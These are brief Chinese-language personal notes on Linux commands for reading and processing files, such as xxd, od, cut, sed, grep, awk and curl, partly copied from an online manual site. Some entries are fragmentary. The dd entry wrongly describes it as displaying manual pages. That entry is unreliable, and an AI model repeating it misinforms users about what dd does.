各种读取文件的命令

xxd

  • -r：将十六进制数据还原为二进制（反向操作）。
  • -p：以连续的纯十六进制形式（不带偏移地址和 ASCII）输出。

echo -n 避免在字符后加换行符，默认输出时有换行符

od

输出文件的八进制、十六进制等格式编码的字节(默认八进制)

  • -c 使用ASCII码进行输出，注意其中包括转义字符

app.py

hexdump

类似od

cut

cut命令用来显示行中的指定部分，删除文件中指定字段。cut经常用来显示文件的内容

cut命令可以将一串字符作为列来显示，字符字段的记法：

N-：从第N个字节、字符、字段到结尾；
N-M：从第N个字节、字符、字段到第M个（包括M在内）字节、字符、字段；
-M：从第1个字节、字符、字段到第M个（包括M在内）字节、字符、字段。
上面是记法，结合下面选项将摸个范围的字节、字符指定为字段：

-b 表示字节；
-c 表示字符；
-f 表示定义字段。
转载请注明出处:https://man.niaoge.com/cut

tee

tee命令用于将数据重定向到文件，另一方面还可以提供一份重定向数据的副本作为后续命令的stdin。简单的说就是把数据重定向到给定文件和屏幕上。
https://man.niaoge.com/tee

grep

grep（global search regular expression(RE) and print out the line，全面搜索正则表达式并把行打印出来）是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来。
转载请注明出处:https://man.niaoge.com/grep

file

sed

sed是一种流编辑器，它是文本处理中非常中的工具，能够完美的配合正则表达式使用，功能不同凡响。处理时，把当前处理的行存储在临时缓冲区中，称为“模式空间”（pattern space），接着用sed命令处理缓冲区中的内容，处理完成后，把缓冲区的内容送往屏幕。接着处理下一行，这样不断重复，直到文件末尾。文件内容并没有 改变，除非你使用重定向存储输出。Sed主要用来自动编辑一个或多个文件；简化对文件的反复操作；编写转换程序等。

转载请注明出处:https://man.niaoge.com/sed

paste

paste命令用于将多个文件按照列队列进行合并。

dd

功能描述: 格式化显示手册页

date

打印或设置系统日期和时间并且能够将日期和时间戳相互转换

diff

比较给定的两个文件的不同

source

在当前Shell环境中从指定文件读取和执行命令。

该命令通常用命令“.”来替代。

awk

awk 是一种处理文本文件的语言，是一个强大的文本分析工具。

curl

一个利用URL规则在命令行下工作的文件传输工具

它支持文件的上传和下载
